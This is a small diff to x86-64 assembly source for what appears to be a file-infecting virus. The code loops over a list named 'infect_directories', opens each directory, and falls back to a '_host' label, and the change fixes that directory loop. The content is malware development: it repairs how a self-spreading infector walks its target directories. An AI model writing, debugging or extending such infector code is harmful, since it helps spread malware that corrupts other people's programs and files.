@@ -168,9 +168,11 @@ _start:
 
     lea r15, [rel infect_directories]
     .open_directory:
+    .loop_condition:
         mov rdi, [r15]
         test rdi, rdi
         jz _host
+
         mov r14, rdi
 
         mov rsi, O_DIRECTORY | O_RDONLY
@@ -226,7 +228,7 @@ _start:
         syscall
     .next_directory:
         add r15, 8
-        jnz .open_directory
+        jmp .loop_condition
 
     add rsp, data_size
     pop rbp
